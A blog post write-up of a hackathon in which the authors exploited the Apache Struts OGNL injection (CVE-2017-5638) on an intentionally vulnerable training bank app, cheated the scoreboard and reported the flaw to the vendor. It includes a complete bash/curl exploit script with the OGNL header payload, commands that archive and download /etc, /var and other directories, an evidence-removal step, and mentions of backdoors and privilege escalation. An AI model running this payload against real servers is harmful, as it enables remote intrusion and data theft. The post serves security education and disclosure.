---
layout: post
title: "Shadow Bank pwn: cheating a hackathon for fun and profit"
---

## Apache Struts and Equifax: real life consequences

**9/14/2017 Update:** The Apache Struts vulnerability discussed in this blog was found to be the flaw that led to the Equifax data breach. While hacking games are fun, it's a reminder that legitimate applications have these vulnerabilities, with real-life consequences and extremely high stakes. For more details on the Apache Struts vulnerability and a hackathon where we used it to own an application server, continue reading.


## Introduction

A few weeks ago my friend (1) and I attended a hackathon sponsored by a local ISSA chapter (2). The hackathon was a hands-on event where participants learned about common web application vulnerabilities in a fun, gamified environment. The [technical platform for this hackathon](https://www.securityinnovation.com/training/hackathon) was provided by Security Innovation (3).

At the end of the event, the two of us finished first and second, with nearly half of the available points each. Security Innovation, however, graciously kept the game open for a few more days to give the participants an opportunity to continue to play and learn.

We used this opportunity to find and exploit more vulnerabilities in the application, and ultimately discover the one that allowed us to completely own the application server.

<!--more-->

* TOC
{:toc}

## Background

The hacking game was called CMD+CTRL and was composed of the main server hosting the event (complete with progress tracking and scoreboard) and the Shadow Bank web application as the attack target. Each participant had their own, individual cloud instance of the application server to hack.

Shadow Bank is an online bank proud of its cutting edge security practices like use of unsalted password hashes, legacy ciphers and obscure cryptocurrencies. Their developers don’t seem to care much about input validation, output encoding or SQL query parameterization. They also seem to believe that personal information posted publicly is not a big deal. As a result, we have an application with several dozen holes, that is fun to break for both beginners and experienced hackers alike.

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/01-login.jpg)


## Apache Struts injection

After doing a bit of reconnaissance on the application, we found a default naming convention for the Apache Struts MVC framework - the .action suffix was used on several application pages.

From there, a quick test with Metasploit’s _exploit/multi/http/struts2_content_type_ognl_ showed that the version of Struts used by Shadow Bank was vulnerable to the recent and infamous [CVE-2017-5638](https://www.cvedetails.com/cve/CVE-2017-5638/) (Remote code execution in Apache Struts before 2.5.10.1, CVSS Score 10).

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/02-metasploit-check.jpg)


## Running remote commands

Unfortunately, the built-in payload (reverse shell) did not work due to firewalls and network filtering on the server side:

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/03-metasploit-run.jpg)

We went ahead and proxied the exploit through a local intercepting proxy and studied its [source code](https://www.exploit-db.com/exploits/41614/) to gain the knowledge that would let us write our own exploit that suits our needs.

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/04-metasploit-proxy.jpg)

Here is the request sent by Metasploit:

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/05-request.jpg)

And here is the server’s response:

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/06-response.jpg)

The request syntax is ... um ... rather interesting. But as you can see, it calls a Java method to retrieve the OS name and put the result value in a custom header. This confirmed that the injected code did indeed execute on the server.


## Customizing the exploit

With the simple proof-of-concept in hand, we then started changing and expanding the payload to execute a shell command and return results via headers. Unfortunately, the application server refused to send more than 50 lines in the headers, so for commands with longer outputs this wouldn’t work. Finally, we crafted an exploit to execute an arbitrary command and save its output locally on the server. We designed the exploit to have the results in the _ShadowBank_ app folder, so we could retrieve them later via a standard HTTP request.

In the end, our exploit was a simple Bash script with two _curl_ commands - one to send the payload, another to retrieve the result:

```
#!/bin/bash

# Application settings
SHADOWBANK="http://xxxx.compute.amazonaws.com/ShadowBank"
SRVPATH=/var/lib/tomcat7/webapps/ShadowBank

# File name for the output
SEC="$(date +'%s').txt"
OUT=$SRVPATH/output/$SEC

# Run the command
curl -i -s -k \
-H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'/bin/sh','-c','mkdir -p $SRVPATH/output; $1 > $OUT 2>&1'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#process.waitFor())}" \
"$SHADOWBANK/" \
>/dev/null

# Retrieve the output
curl "$SHADOWBANK/output/$SEC"
```

With this script, we could run any OS command available to the default Tomcat user:

```
$ ./run-cmd 'uname -a'
Linux ip-10-0-1-182 4.4.44-39.55.amzn1.x86_64 #1 SMP Mon Jan 30 18:15:53 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```


## Exfiltration

The next step was to exfiltrate the data relevant to the web application. Various parts of the application were spread across the file system. While we initially picked just a few things to get us started working on application code like the _ShadowBank.war_ itself, one could just as easily have downloaded pretty much the entire system:

```
# archive the contents of /var, /etc, /opt and /usr to the web server root
./run-cmd 'tar czf /tmp/var.tgz /var'
./run-cmd 'mv /tmp/var.tgz /var/lib/tomcat7/webapps/ShadowBank/'
./run-cmd 'tar czf /var/lib/tomcat7/webapps/ShadowBank/etc.tgz /etc'
./run-cmd 'tar czf /var/lib/tomcat7/webapps/ShadowBank/opt.tgz /opt'
./run-cmd 'tar czf /var/lib/tomcat7/webapps/ShadowBank/usr.tgz /usr'

# download the archives
wget http://xxxx.compute.amazonaws.com/ShadowBank/etc.tgz
wget http://xxxx.compute.amazonaws.com/ShadowBank/opt.tgz
wget http://xxxx.compute.amazonaws.com/ShadowBank/usr.tgz
wget http://xxxx.compute.amazonaws.com/ShadowBank/var.tgz

# delete the archives (a.k.a. remove evidence)
./run-cmd 'rm /var/lib/tomcat7/webapps/ShadowBank/*.tgz'
```

## Reverse engineering and cheating

Once we had the _ShadowBank.war_ file, we used [JD-GUI](http://jd.benow.ca/) to decompile it and reverse engineer the application. The decompiled code was pretty easy to read and understand. We quickly learned that the app was registering completed challenges in the following manner:

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/08-addcompletedchallenge-1.jpg)

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/09-addcompletedchallenge-2.jpg)

The analysis of _HackathonClient_ class showed that to record a completed challenge, it was sending the challenge ID along with the participant’s unique key to the CMD+CTRL main server.

Now we knew what to do in order to take ourselves to the top of the scoreboard!

We combed through the decompiled code to extract the challenge codes and wrote a small Java program to call _AddCompletedChallenge()_ on all the codes:

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/11-poster.jpg)

Now we needed to get the compiled class onto the server. We could convert it to Base64 and write it to disk on the server with our _run-cmd_, but instead we chose to use Shadow Bank’s legitimate Loan Request functionality to upload the file with _.txt_ extension (there was some extension filtering on the server side):

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/12-upload.jpg)

We then renamed it back to .class with our run-cmd and finally, **executed it on the server to “complete” all challenges and get the perfect score of 11370**:

![screenshot](/assets/2017-04-20-shadow-bank-pwn-hackathon/13-perfect-score.jpg)


## Persistence

The same file upload method (upload as _txt_, rename on the server) could be used to deploy a JSP backdoor or shell for an easier control of the server via a regular browser.

More importantly, such an action would give an attacker continued access to the server even should the Apache Struts vulnerability get patched.

In this particular case we didn’t care too much about persistence since each application server was a disposable virtual machine, and ours would go away soon anyway. However, in a real world scenario, an attacker would almost certainly install at least one such backdoor.


## Potential exposures

### Local privilege escalation
[CVE-2017-6074](http://www.cvedetails.com/cve/CVE-2017-6074/), reported on February 18, 2017, lists Linux kernels through 4.9.11 as vulnerable. Per the “uname -a” command (see above ), the Shadow Bank server was at 4.4.44 dated January 30, which suggested it was vulnerable. [An exploit is available](https://www.exploit-db.com/exploits/41458/), but may need tweaking for a specific kernel version. Unfortunately, we did not have time to try this before the hackathon got closed. If it had succeeded, we would have gotten root access to the server!

### Attacking CMD+CTRL Infrastructure
Having file upload and remote shell capabilities on a Shadow Bank server, one could upload various hacking tools and use the server as a jump box to attack the hackathon infrastructure.
This was clearly out of scope for this hackathon, but in case of an actual malicious attack this attack vector would have been exploited.


## Disclosure and fix

* 3/31/2017: findings reported to the vendor
* 3/31/2017: vendor acknowledged receipt of the report
* 4/3/2017: the production code has been patched
* 4/10/2017: the issue has been fully addressed in all existing instances of the application

Security Innovation also published a great [blog post about responsible disclosures](https://blog.securityinnovation.com/what-does-a-security-company-do-with-responsibly-disclosed-vulnerabilities) with this finding as an example.


## Conclusion

Shadow Bank is a great intentionally vulnerable web application that lets people of different levels of expertise learn something new and master their existing skills. And, just like any other application, it needs to be developed and maintained in such a manner that doesn’t allow its users to perform unintended actions. Specifically, it is very important to patch large and pervasive vulnerabilities as soon as they are made known. Such vulnerabilities quickly become popular targets, exploited by everybody from script kiddies to paid adversaries and state actors. It is no surprise that using vulnerable libraries is on the [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) list and that the Australian Signals Directorate (ASD) lists patching operating systems and applications as two out of their [top four strategies to mitigate cybersecurity incidents](https://www.asd.gov.au/infosec/top-mitigations/mitigations-2017-table.htm)!

We identified and exploited a vulnerability not anticipated by Shadow Bank’s developers. The vulnerability was in a framework rather than in the application code itself, but in a hacking competition anything counts, right? The exploitation gave us remote code execution capabilities on the server which, paired with the file upload feature of the application, opened doors to virtually unlimited possibilities in terms of attacking the application server and potential infiltration of the private network, despite high level of hardening on the target.

Most importantly, this exercise shows the risk of the recent Struts vulnerability and how easy it is to exploit. Hacking a hacking game is just fun, but there are legitimate applications which are still vulnerable and where the stakes are much higher.


## Credits

1. [Alex Ivkin](https://www.linkedin.com/in/alexivkin/) for co-hacking and co-authoring the report
2. [Portland ISSA Chapter](http://portland.issa.org/) for organizing the event
3. [Security Innovation](https://www.securityinnovation.com/) for providing the hackathon platform


## And more...

Alex and I [presented this at BSides PDX](https://bsidespdx.org/events/2017/speakers.html#AlexeiKojenovAlexIvkin) on October 21, 2017. Here is a video of the presentation:

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZWOXkKfflcE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
